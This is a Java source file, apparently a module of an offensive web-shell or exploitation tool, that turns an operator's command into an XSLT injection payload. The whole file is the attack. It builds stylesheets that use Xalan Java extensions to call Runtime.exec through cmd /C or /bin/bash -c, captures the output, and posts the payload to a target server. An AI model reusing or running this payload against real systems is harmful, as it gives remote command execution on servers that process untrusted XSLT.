package com.feihong.executor;

import com.feihong.bean.CommandExecutionResult;
import com.feihong.util.BasicSetting;
import com.feihong.util.WrappedHttpRequest;

public class XSLTCommandExecutor implements CommandExecutor{
    @Override
    public String getName() {
        return "XSLT Translation";
    }

    @Override
    public CommandExecutionResult exec(String command) {

        command = command.replaceAll("&","&amp;");
        command = command.replaceAll("\\\\","&#x5c;");
        command = command.replaceAll("\n","&#xA;");
        command = command.replaceAll("\"","&quot;");
        command = command.replaceAll(">","&gt;");
        command = command.replaceAll("<","&lt;");

        String wrappedCommand;
        if(command.equalsIgnoreCase("ipconfig") || command.trim().equalsIgnoreCase("ifconfig")){
            wrappedCommand = "<xsl:stylesheet version=\"1.0\"\n" +
                    "                xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"  xmlns:j=\"http://xml.apache" +
                    ".org/xalan/java\">\n" +
                    "    <xsl:output method=\"text\" encoding=\"GB2312\" />\n" +
                    "    <xsl:template match=\"/\">\n" +
                    "        <xsl:variable name=\"array\" select=\"j:split(j:java.lang.String.new('" + command + "')," +
                    "',')\" />\n" +
                    "        <xsl:variable name=\"runtime\" select=\"j:java.lang.Runtime.getRuntime()\"/>\n" +
                    "        <xsl:variable name=\"process\" select=\"j:exec($runtime, $array)\"/>\n" +
                    "        <xsl:value-of select=\"j:waitFor($process)\" />\n" +
                    "        <xsl:variable name=\"input\" select=\"j:getInputStream($process)\" />\n" +
                    "        <xsl:variable name=\"baos\" select=\"j:java.io.ByteArrayOutputStream.new()\" />\n" +
                    "        <xsl:variable name=\"byte\" select=\"j:getBytes(j:java.lang.String.new(''))\"" +
                    " />\n" +
                    "        <xsl:variable name=\"bytes\" select=\"j:java.util.Arrays.copyOf($byte, j:available" +
                    "($input))\" />\n" +
                    "        <xsl:variable name=\"len\" select=\"j:read($input, $bytes)\" />\n" +
                    "        <xsl:value-of select=\"j:write($baos,$bytes,0,$len)\" />\n" +
                    "        <xsl:value-of select=\"j:toString($baos)\" />\n" +
                    "        <xsl:value-of select=\"j:close($input)\" />\n" +
                    "        <xsl:value-of select=\"j:close($baos)\" />\n" +
                    "    </xsl:template>\n" +
                    "</xsl:stylesheet>";
        }else{
            if(BasicSetting.getInstance().shellPlatform.trim().equalsIgnoreCase("windows")){
                command = command.replaceAll("'","\\\\&quot;");
                wrappedCommand =  "<xsl:stylesheet version=\"1.0\"\n" +
                        "                xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"  xmlns:j=\"http://xml" +
                        ".apache.org/xalan/java\">\n" +
                        "    <xsl:output method=\"text\" encoding=\"GB2312\" />\n" +
                        "    <xsl:template match=\"/\">\n" +
                        "        <xsl:variable name=\"array\" select=\"j:split(j:java.lang.String.new('cmd,/C," + command + "'),',',3)\" />\n" +
                        "        <xsl:variable name=\"runtime\" select=\"j:java.lang.Runtime.getRuntime()\"/>\n" +
                        "        <xsl:variable name=\"process\" select=\"j:exec($runtime, $array)\"/>\n" +
                        "        <xsl:value-of select=\"j:waitFor($process)\" />\n" +
                        "        <xsl:variable name=\"input\" select=\"j:getInputStream($process)\" />\n" +
                        "        <xsl:variable name=\"baos\" select=\"j:java.io.ByteArrayOutputStream.new()\" />\n" +
                        "        <xsl:variable name=\"byte\" select=\"j:getBytes(j:java.lang.String.new(''))\" />\n" +
                        "        <xsl:variable name=\"bytes\" select=\"j:java.util.Arrays.copyOf($byte, j:available" +
                        "($input))\" />\n" +
                        "        <xsl:variable name=\"len\" select=\"j:read($input, $bytes)\" />\n" +
                        "        <xsl:value-of select=\"j:write($baos,$bytes,0,$len)\" />\n" +
                        "        <xsl:value-of select=\"j:toString($baos)\" />\n" +
                        "        <xsl:value-of select=\"j:close($input)\" />\n" +
                        "        <xsl:value-of select=\"j:close($baos)\" />\n" +
                        "    </xsl:template>\n" +
                        "</xsl:stylesheet>";
            }else{
                if(command.trim().startsWith("python")){
                    command = command.replaceAll("'","\\\\&quot;");
                }else{
                    command = command.replaceAll("'","&quot;");
                }

                wrappedCommand = "<xsl:stylesheet version=\"1.0\"\n" +
                        "                xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"  xmlns:j=\"http://xml" +
                        ".apache.org/xalan/java\">\n" +
                        "    <xsl:output method=\"text\" encoding=\"GB2312\" />\n" +
                        "    <xsl:template match=\"/\">\n" +
                        "        <xsl:variable name=\"array\" select=\"j:split(j:java.lang.String.new('/bin/bash,-c," + command + "'),',',3)\" />\n" +
                        "        <xsl:variable name=\"runtime\" select=\"j:java.lang.Runtime.getRuntime()\"/>\n" +
                        "        <xsl:variable name=\"process\" select=\"j:exec($runtime, $array)\"/>\n" +
                        "        <xsl:value-of select=\"j:waitFor($process)\" />\n" +
                        "        <xsl:variable name=\"input\" select=\"j:getInputStream($process)\" />\n" +
                        "        <xsl:variable name=\"baos\" select=\"j:java.io.ByteArrayOutputStream.new()\" />\n" +
                        "        <xsl:variable name=\"byte\" select=\"j:getBytes(j:java.lang.String.new(''))\" />\n" +
                        "        <xsl:variable name=\"bytes\" select=\"j:java.util.Arrays.copyOf($byte, j:available" +
                        "($input))\" />\n" +
                        "        <xsl:variable name=\"len\" select=\"j:read($input, $bytes)\" />\n" +
                        "        <xsl:value-of select=\"j:write($baos,$bytes,0,$len)\" />\n" +
                        "        <xsl:value-of select=\"j:toString($baos)\" />\n" +
                        "        <xsl:value-of select=\"j:close($input)\" />\n" +
                        "        <xsl:value-of select=\"j:close($baos)\" />\n" +
                        "    </xsl:template>\n" +
                        "</xsl:stylesheet>";
            }
        }

        return WrappedHttpRequest.post(wrappedCommand);
    }
}
